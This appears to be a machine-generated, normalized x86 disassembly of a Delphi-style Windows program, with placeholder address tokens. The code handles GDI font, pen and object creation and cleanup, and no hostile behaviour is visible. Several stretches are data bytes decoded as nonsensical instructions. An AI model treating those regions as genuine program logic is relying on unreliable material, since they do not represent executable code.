add [ eax + eax ] bh
add [ eax ] al
movsb [ edi ] [ esi ]
and [ edx ] eax
lodsb [ esi ]
inc ecx
inc eax
add [ edi + ebp * 2 + 0x41 ] ch
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
sub_42262d
xchg esi eax
inc edx
add [ edi + edx * 4 + 0x5e4c0042 ] cl
inc edx
add al cl
cdq
inc edx
add ah ah
cdq
inc edx
add [ ebx + eax * 4 ] cl
inc edx
add [ eax + 0x5d ] cl
inc edx
add ah dl
pop ebp
inc edx
add al cl
lea eax [ edx ]
movsb [ edi ] [ esi ]
pushfd
inc edx
add [ ebp + ecx * 4 + 0x42 ] al
add [ esp + ebx * 4 - 0x62b3ffbe ] ch
inc edx
add [ eax ] ch
mov [ edx ] eax
mov [ ecx - 0x6a47ffbe ] cl
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42267870
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x4225f870
add [ edx + 0x42 ] ch
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
nop
inc eax
daa
inc edx
add [ eax ] al
jo r-xdata
inc eax
add [ eax ] cl
sub [ edx ] eax
add [ eax ] eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x42 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x27
inc edx
add [ eax + eax ] dh
add [ eax ] al
movsb [ edi ] [ esi ]
and [ edx ] eax
lodsb [ esi ]
inc ecx
inc eax
add [ edi + ebp * 2 + 0x41 ] ch
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ esi + ebx * 4 + 0x42 ] cl
add [ esi + ebp * 2 + 0x5ba40041 ] ch
inc edx
add [ esi + ebx * 4 + 0x42 ] bh
add ah bh
outsd
inc ecx
add [ ebx + ebx * 2 ] dh
inc edx
add ah bl
sahf
inc edx
add al dh
pop ebx
inc edx
add [ eax ] ah
lahf
inc edx
add [ edi + ebx * 4 + 0x42 ] cl
add [ ebx * 2 + 0x5d400042 ] bh
inc edx
add [ eax - 0x61 ] ah
inc edx
add al cl
pop ebp
inc edx
add ah ah
mov eax [ 0x5e2c0042 ]
inc edx
add [ edx ] bl
inc edx
add [ eax ] ah
mov [ 0x5e5c0042 ] al
inc edx
add al bh
popfd
inc edx
add [ eax + 0x5d ] cl
inc edx
add ah dl
pop ebp
inc edx
add [ eax + 0x380042a0 ] ah
mov [ 0xffffffffa2600042 ] al
inc edx
add [ edx + 0x42 ] dh
add ah bh
mov eax [ 0x54050042 ]
dec ecx
arpl [ edi + 0x6e ] bp
mov eax eax
mov ah 0x27
inc edx
add [ edi ] al
add eax 0x6f634954
outsb
inc eax
daa
inc edx
add [ edx + 0x42 ] ch
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
in al 0x26
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x53ffbddd ] ch
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x1fffbd63 ] dh
popfd
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
jmp [ ebx + ebp + 0x42 ]
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_42289b
call esp
sub eax [ edx ]
adc eax 0x75724254
jae r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
push edx
jae r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
jne r-xdata
pop es
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
dec ebp
popad
outsb
popad
jb r-xdata
ror [ ecx + 0x31c289d1 ] 0xc0
dec edx
add [ esi + eax + 0x50 ] dh
call DeleteObject
retn
inc eax
add [ eax + 0x4228 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5fffbdd8 ] bl
sub [ edx ] al
and al 0x0
add [ eax ] al
in al 0x27
inc edx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] cl
sub [ edx ] eax
add [ eax ] eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_4228cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_422908
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_422944
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_4228b8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_42292c
xor edx edx
push ebp
push sub_422a18
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422a1f
mov eax [ ebp - 0x4 ]
call sub_422938
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_402d28
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_402f9c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_4091b0
test al al
je r-xdata
sub_422a28
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_42292c
xor ecx ecx
push ebp
push sub_422ab0
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422938
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_422aec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42292c
xor eax eax
push ebp
push sub_422b55
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_422944
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_422a28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422b5c
mov eax [ ebp - 0x4 ]
call sub_422938
retn
mov eax ebx
mov si 0xfffd
call sub_404160
sub_422b68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42292c
xor eax eax
push ebp
push sub_422bc4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422bcb
mov eax [ ebp - 0x4 ]
call sub_422938
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_404160
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422a28
sub_422be4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42292c
xor eax eax
push ebp
push sub_422c44
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422c4b
mov eax [ ebp - 0x4 ]
call sub_422938
retn
mov esi ebx
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push edi
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_422c54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_416b90
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_422cf1
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4167c8
mov ebx eax
mov eax ebx
call sub_4242e0
inc [ ebp - 0x4 ]
mov eax ebx
call sub_424580
mov eax [ rw-data ]
call sub_422be4
mov eax [ rw-data ]
call sub_422be4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422cf8
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_416bf4
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4167c8
call sub_424450
inc esi
dec ebx
jne r-xdata
sub_423347
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_416270
retn
sub_423378
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xc
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x4
movzx eax [ esp + 0x17 ]
mov [ ebx + 0xe ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_403a00
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xf ]
mov cl 0x1f
call sub_403618
movzx eax [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0xd ] 0x8
mov [ ebx + 0xc ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov eax [ esp + 0xc ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x0
mov [ ebx + 0xc ] 0x1
jmp r-xdata
sub_423438
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422944
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_42348c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422a28
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_4234d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416dc8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423184
xor eax eax
push ebp
push sub_42358b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423184
xor eax eax
push ebp
push sub_42356e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422b68
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42360c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423575
mov eax [ ebp - 0x8 ]
call sub_423194
retn
mov eax ebx
call sub_423950
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42396c
sub_4235bc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423184
xor eax eax
push ebp
push sub_423601
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422aec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423608
mov eax [ ebp - 0x4 ]
call sub_423194
retn
sub_423620
push ebx
mov ebx eax
movzx eax [ ebx + 0xe ]
cmp al [ rw-data ]
jne r-xdata
xor eax eax
pop ebx
retn
mov eax rw-data
lea edx [ ebx + 0xf ]
movzx ecx [ eax ]
inc ecx
call sub_4036b8
je r-xdata
mov al 0x1
pop ebx
retn
sub_42364c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_423868
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42386f
lea eax [ ebp - 0x50 ]
mov edx 0x4
call sub_404e68
retn
mov eax [ rw-data ]
call sub_42292c
xor edx edx
push ebp
push sub_423840
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422938
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
mov [ ebp - 0x29 ] al
cmp [ rw-data ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1e ]
cmp al 0x1
jne r-xdata
mov edi r-xdata
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
movzx eax [ rw-data ]
mov [ ebp - 0x29 ] al
jmp r-xdata
push edi
mov eax r-xdata
call sub_405324
push eax
push esi
lea eax [ ebp - 0x48 ]
mov edx [ ebp - 0x4 ]
add edx 0x1f
call sub_4050a8
mov eax [ ebp - 0x48 ]
call sub_405324
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1f
call sub_4050a8
mov esi [ ebp - 0x44 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x50 ]
mov edx [ ebp - 0x4 ]
add edx 0x1f
call sub_4050a8
mov edx [ ebp - 0x50 ]
lea eax [ ebp - 0x24 ]
call sub_40a3b0
lea eax [ ebp - 0x4c ]
mov edx rw-data
call sub_4050a8
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_40a3b0
jmp r-xdata
mov [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call sub_42a2c0
cmp al 0x80
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x28 ] 0x7
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x10
call sub_423620
test al al
je r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_4239c4
dec al
je r-xdata
mov [ ebp - 0x29 ] 0x80
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_423888
push ebx
push esi
add esp 0xffffffd0
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_423378
mov edx esp
mov eax ebx
call sub_4235bc
add esp 0x30
pop esi
pop ebx
retn
sub_4238b4
push ebx
push esi
add esp 0xffffffd0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4235a4
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4235bc
add esp 0x30
pop esi
pop ebx
retn
sub_4238f4
push ebx
push esi
add esp 0xfffffed0
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x130
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4235a4
lea eax [ esp + 0xf ]
xor ecx ecx
mov edx 0x20
call sub_403728
lea eax [ esp + 0x30 ]
mov edx esi
mov ecx 0xff
call sub_4050fc
lea edx [ esp + 0x30 ]
lea eax [ esp + 0xf ]
mov cl 0x1f
call sub_403618
mov edx esp
mov eax ebx
call sub_4235bc
sub_42396c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_4238b4
pop esi
pop ebx
retn
sub_423998
push ebx
add esp 0xffffffcc
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4235a4
movzx eax [ esp ]
mov [ esp + 0x11 ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4235bc
add esp 0x34
pop ebx
retn
sub_4239cc
push ebx
push esi
add esp 0xffffffd0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4235a4
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_4235bc
add esp 0x30
pop esi
pop ebx
retn
sub_4239fc
push ebx
push esi
add esp 0xffffffd0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4235a4
mov [ esp + 0xe ] bl
mov edx esp
mov eax esi
call sub_4235bc
add esp 0x30
pop esi
pop ebx
retn
sub_423a2c
push ebx
push esi
add esp 0xffffffd0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4235a4
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_4235bc
add esp 0x30
pop esi
pop ebx
retn
sub_423a54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422944
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_423a98
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422a28
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_423ac0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416dc8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423184
xor eax eax
push ebp
push sub_423b60
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423184
xor eax eax
push ebp
push sub_423b43
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422b68
movzx edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423ca8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423b4a
mov eax [ ebp - 0x8 ]
call sub_423194
retn
sub_423b78
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_423b90
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423184
xor eax eax
push ebp
push sub_423bd5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422aec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423bdc
mov eax [ ebp - 0x4 ]
call sub_423194
retn
sub_423be8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423b78
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_423b90
add esp 0x10
pop esi
pop ebx
retn
sub_423c10
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_42292c
xor eax eax
push ebp
push sub_423c96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422938
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423140
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_423cc4
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423b78
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_423b90
add esp 0x10
pop esi
pop ebx
retn
sub_423cf4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423b78
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_423b90
sub_423d20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422944
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_423d60
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422a28
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_423d88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416dc8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423184
xor eax eax
push ebp
push sub_423e18
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423184
xor eax eax
push ebp
push sub_423dfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422b68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e02
mov eax [ ebp - 0x8 ]
call sub_423194
retn
sub_423e30
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_423e4c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423184
xor eax eax
push ebp
push sub_423e91
push [ fs : eax ]
mov [ fs : eax ] esp
